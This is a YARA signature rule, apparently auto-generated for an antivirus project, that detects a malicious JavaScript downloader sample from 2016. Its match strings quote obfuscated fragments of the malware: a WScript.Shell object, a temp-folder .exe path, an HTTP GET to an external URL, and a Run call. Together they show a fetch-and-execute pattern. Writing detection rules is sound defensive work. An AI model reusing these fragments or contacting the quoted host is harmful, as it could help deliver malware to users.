rule sig_20160328_621e4c4803c80e54bdbd4d7ca8508d81 {
  meta:
    description = "datamaliciousorder - file 20160328_621e4c4803c80e54bdbd4d7ca8508d81.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c15fa2f8f1b15f76265ad0c936a8e25b8235c3c218b32be68d9644e68c5dcaa3"

  strings:
    $s1  = "function Emmdcloo() {return Fkzkfn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"POZiZq4hODe.exe\";};" fullword ascii
    $s2  = "Iiarukq[Sawzhfxu](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Rhmhnvb](Fvhivkes() * 11)} while (Iiarukq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Fkzkfn = function Fwfkdklfs() {return WScript[Upphcn](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Naqsyqmtvx(Orouzbimmf, Chmjx){return Orouzbimmf - Chmjx;};" fullword ascii
    $s6  = "function Kpaxya(Elmblckx){Fkzkfn[\"Run\"](Elmblckx, Bkglla, Bkglla);};" fullword ascii
    $s7  = "function Dinqt() {return ((Tffcwnb == true) && (Tffcwnb == Imxgjqkgz)) ? 1 : Bkglla;};" fullword ascii
    $s8  = "Tffcwnb = true; " fullword ascii
    $s9  = "return Naqsyqmtvx(Nobzutwwp, Ryiom);" fullword ascii
    $s10 = "function Fvhivkes(){return 22;};" fullword ascii
    $s11 = " while (Auohae){" fullword ascii
    $s12 = "function Ymtisqvtf()" fullword ascii
    $s13 = "var Eslvr = false;" fullword ascii
    $s14 = "function Cwylwg(){return Upphcn;};" fullword ascii
    $s15 = "function Mekxnie(){return Mhvmj;};" fullword ascii
    $s16 = "Imxgjqkgz = true; " fullword ascii
    $s17 = "function Yxjbluoj(Mlucjvn) {var Gomothet = (1, 2, 3, 4, 5, Mlucjvn); return Gomothet;};" fullword ascii
    $s18 = "var Imxgjqkgz = false;" fullword ascii
    $s19 = "var Cdvmi = new this[\"Date\"]();" fullword ascii
    $s20 = "var Tffcwnb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}